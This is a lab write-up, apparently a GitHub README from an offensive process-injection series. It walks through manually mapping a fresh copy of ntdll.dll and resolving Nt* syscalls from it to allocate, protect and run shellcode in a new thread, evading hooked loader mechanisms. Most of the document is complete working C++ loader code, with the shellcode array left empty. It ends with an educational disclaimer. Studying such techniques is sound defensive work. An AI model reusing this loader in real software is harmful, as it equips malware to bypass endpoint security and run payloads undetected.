<h1 align="center">Unhook NTDLL.DLL (Lagos Island)</h1>
<p align="center">
  <img src="../Assets/lagos_AI.jpg" alt="UH" width="500px">
</p>

## Overview
In this lab, we cover a Reflective DLL Loading technique. This technique to manually load and execute a DLL from disk into memory, often referred to as reflective DLL loading. This is useful in scenarios where loading a DLL without registering it in the process's module list is required, a common tactic in malware evasion and advanced threat emulation. The code manually maps the sections of the DLL into memory, resolves imports and exports, and executes shellcode through NtCreateThreadEx, avoiding standard Windows loader mechanisms. 

## Steps
1. `Open the DLL File:` This step uses `CreateFileA` to open the ntdll.dll file from disk for reading.
2. `Get the File Size:` Use `GetFileSize` to retrieve the size of the opened DLL file to determine how much memory to allocate.
3. `Allocate Memory for the DLL:` Use `malloc` to allocate memory locally for the DLL's contents based on the file size.
4. `Read the DLL into Memory:` Use `ReadFile` to load the contents of the DLL file into the allocated memory buffer.
5. `Parse the PE Headers:` Access and parse the DOS header `(IMAGE_DOS_HEADER) and NT header (IMAGE_NT_HEADERS)` to understand the structure of the DLL.
6. `Allocate Memory in the Current Process:` Use VirtualAlloc to allocate memory in the current process's address space based on the size of the DLL’s image.
7. `Copy Headers and Sections into Memory:` Copy the DLL's headers and sections from the local memory buffer to the allocated memory region in the current process using `CopyMemory`.
8. `Resolve the Import Address Table (IAT):` Use `LoadLibraryA and GetProcAddress` to resolve and update the addresses of imported functions in the DLL by traversing the Import Directory.
9. `Fix the Export Address Table (EAT):` Locate the Export Directory and resolve the exported functions addresses by updating the function pointers to match the addresses in the loaded memory.
10. `Allocate Memory for Shellcode:` Use `NtAllocateVirtualMemory` to allocate memory for shellcode execution within the current process.
11. `Copy the Shellcode to Allocated Memory:` Use `memcpy` to copy the shellcode into the newly allocated memory region.
12. `Create a New Thread to Execute Shellcode:` Use `NtCreateThreadEx` to create a new thread and execute the shellcode within the allocated memory region.

## Walkthrough

The code begins by opening a DLL file (ntdll.dll) from disk and reading its contents into memory. 
* `CreateFileA:` Opens the DLL file in read mode.
* `GetFileSize:` Retrieves the size of the DLL file.
* `ReadFile:` Reads the contents of the DLL file into a buffer (dllBuffer).
```cpp
// Open DLL file and read it into memory
	HANDLE hFile = CreateFileA("E:\\My Directory\\PE-DATA\\Reflective_DLL_Loading_Lagos_Island\\x64\\Release\\ntdll.dll", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		std::cerr << "Failed to open DLL file." << std::endl;
		return 1;
	}
    // Get the file size
    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        std::cerr << "Failed to get file size" << std::endl;
        CloseHandle(hFile);
        return 1;
    }

    // Allocate buffer
    char* dllBytes = (char*)malloc(fileSize);
    if (dllBytes == nullptr) {
        std::cerr << "Failed to allocate memory" << std::endl;
        CloseHandle(hFile);
        return 1;
    }

    // Read the file into memory
    DWORD bytesRead;
    if (!ReadFile(hFile, dllBytes, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        std::cerr << "Failed to read file into memory" << std::endl;
        free(dllBytes);
        CloseHandle(hFile);
        return 1;
    }
```
Once the DLL file is read, the code parses the file's headers to retrieve the sections and maps them into a newly allocated region of memory.
*  Parse the DOS header `(PIMAGE_DOS_HEADER)` and NT headers `(PIMAGE_NT_HEADERS)` from the DLL buffer.
* `VirtualAllocEx:` Allocates memory in the target process for the DLL based on its `ImageBase` and `SizeOfImage` from the NT headers.
```cpp
    IMAGE_DOS_HEADER* DOS_HEADER = (IMAGE_DOS_HEADER*)dllBytes;
    IMAGE_NT_HEADERS* NT_HEADER = (IMAGE_NT_HEADERS*)((DWORD64)dllBytes + DOS_HEADER->e_lfanew);

    SIZE_T sizeDll = NT_HEADER->OptionalHeader.SizeOfImage;

    LPVOID alloc_mem = VirtualAlloc(0, sizeDll, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    CopyMemory(alloc_mem, dllBytes, NT_HEADER->OptionalHeader.SizeOfHeaders);
```
This code iterates over the section headers of the DLL and copies each section into the appropriate location in memory:
```cpp
 //loading the all sections into memory
    IMAGE_SECTION_HEADER* SECTION_HEADER = IMAGE_FIRST_SECTION(NT_HEADER);
    for (int i = 0; i < NT_HEADER->FileHeader.NumberOfSections; i++) {

        LPVOID sectionDest = (LPVOID)((DWORD64)alloc_mem + (DWORD64)SECTION_HEADER->VirtualAddress);
        LPVOID sectionSource = (LPVOID)((DWORD64)dllBytes + (DWORD64)SECTION_HEADER->PointerToRawData);
        CopyMemory(sectionDest, sectionSource, SECTION_HEADER->SizeOfRawData);

        SECTION_HEADER++;
    }
```
After the sections are loaded, the code resolves the DLL’s imports, using `LoadLibraryA and GetProcAddress` to dynamically resolve function addresses for imported modules.
```cpp
   // Copy IAT to memory

    IMAGE_IMPORT_DESCRIPTOR* IMPORT_DATA = (IMAGE_IMPORT_DESCRIPTOR*)((DWORD64)alloc_mem + NT_HEADER->OptionalHeader.DataDirectory[1].VirtualAddress);

    LPCSTR ModuleName = "";
    while (IMPORT_DATA->Name != NULL) {

        ModuleName = (LPCSTR)IMPORT_DATA->Name + (DWORD64)alloc_mem;
        IMAGE_THUNK_DATA* firstThunk;
        HMODULE hmodule = LoadLibraryA(ModuleName);
        if (hmodule) {
            firstThunk = (IMAGE_THUNK_DATA*)((DWORD64)alloc_mem + IMPORT_DATA->FirstThunk);
            for (int i = 0; firstThunk->u1.AddressOfData; firstThunk++) {

                DWORD64 importFn = (DWORD64)alloc_mem + *(DWORD*)firstThunk;
                LPCSTR n = (LPCSTR)((IMAGE_IMPORT_BY_NAME*)importFn)->Name;	// get the name of each imported function 
                *(DWORD64*)firstThunk = (DWORD64)GetProcAddress(hmodule, n);
            }
        }
        IMPORT_DATA++;
    }
```
This code looks through the export directory of the loaded DLL to resolve specific NT functions, such as NtAllocateVirtualMemory, NtProtectVirtualMemory, and NtCreateThreadEx.
```cpp
  // Copy EAT to memory

    IMAGE_EXPORT_DIRECTORY* EXPORT_DIR = (IMAGE_EXPORT_DIRECTORY*)((DWORD64)alloc_mem + NT_HEADER->OptionalHeader.DataDirectory[0].VirtualAddress);

    DWORD* addrNames = (DWORD*)((DWORD64)alloc_mem + EXPORT_DIR->AddressOfNames);
    DWORD* addrFunction = (DWORD*)((DWORD64)alloc_mem + EXPORT_DIR->AddressOfFunctions);
    WORD* addrOrdinal = (WORD*)((DWORD64)alloc_mem + EXPORT_DIR->AddressOfNameOrdinals);
    DWORD OldProtect = 0;
    VirtualProtect(alloc_mem, fileSize, PAGE_EXECUTE_READ, &OldProtect);

    printf("[+] Successfully Mapped ntdll @ %p\n", alloc_mem);

    DWORD* addrNames1 = addrNames;
    _NtAllocateVirtualMemory pNtAllocateVirtualMemory = NULL;
    char NtAllocateVirtualMemorytxt[] = { 'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y', 0 };
	for (int index = 0; index < EXPORT_DIR->NumberOfFunctions; index++) {
		char* name = (char*)((DWORD64)alloc_mem + *(DWORD*)addrNames1++);
		
        if (strstr(name, NtAllocateVirtualMemorytxt) != NULL) {
			pNtAllocateVirtualMemory = (_NtAllocateVirtualMemory)((DWORD64)alloc_mem + addrFunction[addrOrdinal[index]]);
			break;
		}
        
	}
    
	if (pNtAllocateVirtualMemory) {
        NTSTATUS status1 = pNtAllocateVirtualMemory(NtCurrentProcess(), &BaseAddress, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!NT_SUCCESS(status1)) {
            return 1;
        }
        printf("\n[+] RW Virtual Memory Successfully Allocated @ %p\n", pNtAllocateVirtualMemory);
	}
 
    memcpy(BaseAddress, shellcode, shellcodeSize);
  
    printf("[+] Successfully Wrote the Shellocode into allocated Memory !!!\n");
    DWORD* addrNames2 = addrNames;
    _NtProtectVirtualMemory pNtProtectVirtualMemory = NULL;
    char NtProtectVirtualMemorytxt[] = { 'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y',0 };
    for (int index = 0; index < EXPORT_DIR->NumberOfFunctions; index++) {
        char* name = (char*)((DWORD64)alloc_mem + *(DWORD*)addrNames2++);

        if (strstr(name, NtProtectVirtualMemorytxt) != NULL) {
            pNtProtectVirtualMemory = (_NtProtectVirtualMemory)((DWORD64)alloc_mem + addrFunction[addrOrdinal[index]]);
            break;
        }

    }
    if (pNtProtectVirtualMemory) {
        NTSTATUS status2 = pNtProtectVirtualMemory(NtCurrentProcess(), &BaseAddress, (PSIZE_T)&shellcodeSize, PAGE_EXECUTE_READ, &OldProtect);
        if (!NT_SUCCESS(status2)) {
            return 1;
        }
        printf("\n[+] Changed the permission of memory from RW to RX @ %p\n", pNtProtectVirtualMemory);
    }
    DWORD* addrNames3 = addrNames;
    _NtCreateThreadEx pNtCreateThreadEx = NULL;
    char NtCreateThreadExtxt[] = { 'N','t','C','r','e','a','t','e','T','h','r','e','a','d','E','x',0 };
    for (int index = 0; index < EXPORT_DIR->NumberOfFunctions; index++) {
        char* name = (char*)((DWORD64)alloc_mem + *(DWORD*)addrNames3++);

        if (strstr(name, NtCreateThreadExtxt) != NULL) {
            pNtCreateThreadEx = (_NtCreateThreadEx)((DWORD64)alloc_mem + addrFunction[addrOrdinal[index]]);
            break;
        }

    }
    if (pNtCreateThreadEx) {
        NTSTATUS status3 = pNtCreateThreadEx(&hHostThread, 0x1FFFFF, NULL, NtCurrentProcess(), (LPTHREAD_START_ROUTINE)BaseAddress, NULL, FALSE, NULL, NULL, NULL, NULL);
        if (!NT_SUCCESS(status3)) {
            return 1;
        }
        printf("\n[+] Executed Shellcode............!!! @ %p\n", pNtCreateThreadEx);
    }
```
Finally, the code executes the shellcode by creating a new thread using NtCreateThreadEx:
```cpp
if (pNtCreateThreadEx) {
        NTSTATUS status3 = pNtCreateThreadEx(&hHostThread, 0x1FFFFF, NULL, NtCurrentProcess(), (LPTHREAD_START_ROUTINE)BaseAddress, NULL, FALSE, NULL, NULL, NULL, NULL);
        if (!NT_SUCCESS(status3)) {
            return 1;
        }
        printf("\n[+] Executed Shellcode............!!! @ %p\n", pNtCreateThreadEx);
    }
```

## Full Code
### Loader/Injector Code
#### data.h
```cpp
#pragma once
#include <Windows.h>

struct Rawfile {

    LPVOID ntdll;
    DWORD size;

};

typedef NTSTATUS(*_NtAllocateVirtualMemory)(
    HANDLE    ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T   RegionSize,
    ULONG     AllocationType,
    ULONG     Protect
    );

typedef NTSTATUS(*_NtProtectVirtualMemory)(
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG NewProtect,
    OUT PULONG OldProtect);

typedef NTSTATUS(*_NtCreateThreadEx)(
    OUT PHANDLE hThread,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes,
    IN HANDLE ProcessHandle,
    IN PVOID lpStartAddress,
    IN PVOID lpParameter,
    IN ULONG Flags,
    IN SIZE_T StackZeroBits,
    IN SIZE_T SizeOfStackCommit,
    IN SIZE_T SizeOfStackReserve,
    OUT PVOID lpBytesBuffer
    );

typedef NTSTATUS(*_NtWaitForSingleObject)(
    IN HANDLE         Handle,
    IN BOOLEAN        Alertable,
    IN PLARGE_INTEGER Timeout
    );
```
#### source.cpp
```cpp
#include <Windows.h>
#include <stdio.h>
#include <vector>
#include <psapi.h>
#include <winternl.h>
#include "data.h"
#include <iostream>

#pragma comment(lib, "ntdll")

#define NtCurrentProcess() ((HANDLE)-1)

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif


unsigned char shellcode[] = {
	
};

SIZE_T shellcodeSize = sizeof(shellcode);

PVOID BaseAddress = NULL;
DWORD OldProtect = 0;
HANDLE hHostThread = INVALID_HANDLE_VALUE;

int main(int argc, char** argv) {

	// Open DLL file and read it into memory
	HANDLE hFile = CreateFileA("E:\\My Directory\\PE-DATA\\Reflective_DLL_Loading_Lagos_Island\\x64\\Release\\ntdll.dll", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		std::cerr << "Failed to open DLL file." << std::endl;
		return 1;
	}
    // Get the file size
    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        std::cerr << "Failed to get file size" << std::endl;
        CloseHandle(hFile);
        return 1;
    }

    // Allocate buffer
    char* dllBytes = (char*)malloc(fileSize);
    if (dllBytes == nullptr) {
        std::cerr << "Failed to allocate memory" << std::endl;
        CloseHandle(hFile);
        return 1;
    }

    // Read the file into memory
    DWORD bytesRead;
    if (!ReadFile(hFile, dllBytes, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        std::cerr << "Failed to read file into memory" << std::endl;
        free(dllBytes);
        CloseHandle(hFile);
        return 1;
    }

    CloseHandle(hFile);

    IMAGE_DOS_HEADER* DOS_HEADER = (IMAGE_DOS_HEADER*)dllBytes;
    IMAGE_NT_HEADERS* NT_HEADER = (IMAGE_NT_HEADERS*)((DWORD64)dllBytes + DOS_HEADER->e_lfanew);

    SIZE_T sizeDll = NT_HEADER->OptionalHeader.SizeOfImage;

    LPVOID alloc_mem = VirtualAlloc(0, sizeDll, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    CopyMemory(alloc_mem, dllBytes, NT_HEADER->OptionalHeader.SizeOfHeaders);

    //loading the all sections into memory
    IMAGE_SECTION_HEADER* SECTION_HEADER = IMAGE_FIRST_SECTION(NT_HEADER);
    for (int i = 0; i < NT_HEADER->FileHeader.NumberOfSections; i++) {

        LPVOID sectionDest = (LPVOID)((DWORD64)alloc_mem + (DWORD64)SECTION_HEADER->VirtualAddress);
        LPVOID sectionSource = (LPVOID)((DWORD64)dllBytes + (DWORD64)SECTION_HEADER->PointerToRawData);
        CopyMemory(sectionDest, sectionSource, SECTION_HEADER->SizeOfRawData);

        SECTION_HEADER++;
    }
    // Copy IAT to memory

    IMAGE_IMPORT_DESCRIPTOR* IMPORT_DATA = (IMAGE_IMPORT_DESCRIPTOR*)((DWORD64)alloc_mem + NT_HEADER->OptionalHeader.DataDirectory[1].VirtualAddress);

    LPCSTR ModuleName = "";
    while (IMPORT_DATA->Name != NULL) {

        ModuleName = (LPCSTR)IMPORT_DATA->Name + (DWORD64)alloc_mem;
        IMAGE_THUNK_DATA* firstThunk;
        HMODULE hmodule = LoadLibraryA(ModuleName);
        if (hmodule) {
            firstThunk = (IMAGE_THUNK_DATA*)((DWORD64)alloc_mem + IMPORT_DATA->FirstThunk);
            for (int i = 0; firstThunk->u1.AddressOfData; firstThunk++) {

                DWORD64 importFn = (DWORD64)alloc_mem + *(DWORD*)firstThunk;
                LPCSTR n = (LPCSTR)((IMAGE_IMPORT_BY_NAME*)importFn)->Name;	// get the name of each imported function 
                *(DWORD64*)firstThunk = (DWORD64)GetProcAddress(hmodule, n);
            }
        }
        IMPORT_DATA++;
    }

    // Copy EAT to memory

    IMAGE_EXPORT_DIRECTORY* EXPORT_DIR = (IMAGE_EXPORT_DIRECTORY*)((DWORD64)alloc_mem + NT_HEADER->OptionalHeader.DataDirectory[0].VirtualAddress);

    DWORD* addrNames = (DWORD*)((DWORD64)alloc_mem + EXPORT_DIR->AddressOfNames);
    DWORD* addrFunction = (DWORD*)((DWORD64)alloc_mem + EXPORT_DIR->AddressOfFunctions);
    WORD* addrOrdinal = (WORD*)((DWORD64)alloc_mem + EXPORT_DIR->AddressOfNameOrdinals);
    DWORD OldProtect = 0;
    VirtualProtect(alloc_mem, fileSize, PAGE_EXECUTE_READ, &OldProtect);

    printf("[+] Successfully Mapped ntdll @ %p\n", alloc_mem);

    DWORD* addrNames1 = addrNames;
    _NtAllocateVirtualMemory pNtAllocateVirtualMemory = NULL;
    char NtAllocateVirtualMemorytxt[] = { 'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y', 0 };
	for (int index = 0; index < EXPORT_DIR->NumberOfFunctions; index++) {
		char* name = (char*)((DWORD64)alloc_mem + *(DWORD*)addrNames1++);
		
        if (strstr(name, NtAllocateVirtualMemorytxt) != NULL) {
			pNtAllocateVirtualMemory = (_NtAllocateVirtualMemory)((DWORD64)alloc_mem + addrFunction[addrOrdinal[index]]);
			break;
		}
        
	}
    
	if (pNtAllocateVirtualMemory) {
        NTSTATUS status1 = pNtAllocateVirtualMemory(NtCurrentProcess(), &BaseAddress, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!NT_SUCCESS(status1)) {
            return 1;
        }
        printf("\n[+] RW Virtual Memory Successfully Allocated @ %p\n", pNtAllocateVirtualMemory);
	}
 
    memcpy(BaseAddress, shellcode, shellcodeSize);
  
    printf("[+] Successfully Wrote the Shellocode into allocated Memory !!!\n");
    DWORD* addrNames2 = addrNames;
    _NtProtectVirtualMemory pNtProtectVirtualMemory = NULL;
    char NtProtectVirtualMemorytxt[] = { 'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y',0 };
    for (int index = 0; index < EXPORT_DIR->NumberOfFunctions; index++) {
        char* name = (char*)((DWORD64)alloc_mem + *(DWORD*)addrNames2++);

        if (strstr(name, NtProtectVirtualMemorytxt) != NULL) {
            pNtProtectVirtualMemory = (_NtProtectVirtualMemory)((DWORD64)alloc_mem + addrFunction[addrOrdinal[index]]);
            break;
        }

    }
    if (pNtProtectVirtualMemory) {
        NTSTATUS status2 = pNtProtectVirtualMemory(NtCurrentProcess(), &BaseAddress, (PSIZE_T)&shellcodeSize, PAGE_EXECUTE_READ, &OldProtect);
        if (!NT_SUCCESS(status2)) {
            return 1;
        }
        printf("\n[+] Changed the permission of memory from RW to RX @ %p\n", pNtProtectVirtualMemory);
    }
    DWORD* addrNames3 = addrNames;
    _NtCreateThreadEx pNtCreateThreadEx = NULL;
    char NtCreateThreadExtxt[] = { 'N','t','C','r','e','a','t','e','T','h','r','e','a','d','E','x',0 };
    for (int index = 0; index < EXPORT_DIR->NumberOfFunctions; index++) {
        char* name = (char*)((DWORD64)alloc_mem + *(DWORD*)addrNames3++);

        if (strstr(name, NtCreateThreadExtxt) != NULL) {
            pNtCreateThreadEx = (_NtCreateThreadEx)((DWORD64)alloc_mem + addrFunction[addrOrdinal[index]]);
            break;
        }

    }
    if (pNtCreateThreadEx) {
        NTSTATUS status3 = pNtCreateThreadEx(&hHostThread, 0x1FFFFF, NULL, NtCurrentProcess(), (LPTHREAD_START_ROUTINE)BaseAddress, NULL, FALSE, NULL, NULL, NULL, NULL);
        if (!NT_SUCCESS(status3)) {
            return 1;
        }
        printf("\n[+] Executed Shellcode............!!! @ %p\n", pNtCreateThreadEx);
    }
    LARGE_INTEGER Timeout;
    Timeout.QuadPart = -10000000;
   
    NTSTATUS NTWFSOstatus = NtWaitForSingleObject(hHostThread, FALSE, &Timeout);
    if (!NT_SUCCESS(NTWFSOstatus)) {
        printf("[!] Failed in NtWa1tF0rS1ngle0bj3ct (%u)\n", GetLastError());
        return 4;
    }

    printf("\n\n[+] Work has been Done!!!!\n");

    VirtualProtect(alloc_mem, fileSize, PAGE_READONLY, &OldProtect);
    printf("\n\n[+] Changed the permission of allocated region to R before quitting!!!!\n");
    return 0;
}


```
## Demonstration

![](Assets/PE7.gif)

For GitHub-Repo Click Here: [Offensive-Panda/ProcessInjectionTechniques](https://github.com/Offensive-Panda/ProcessInjectionTechniques/tree/main/Reflective_DLL_Loading_Lagos_Island/Reflective_DLL_Loading_Lagos_Island)

### Disclaimer
The content provided on this series is for educational and informational purposes only. It is intended to help users understand cybersecurity concepts and techniques for improving security defenses!
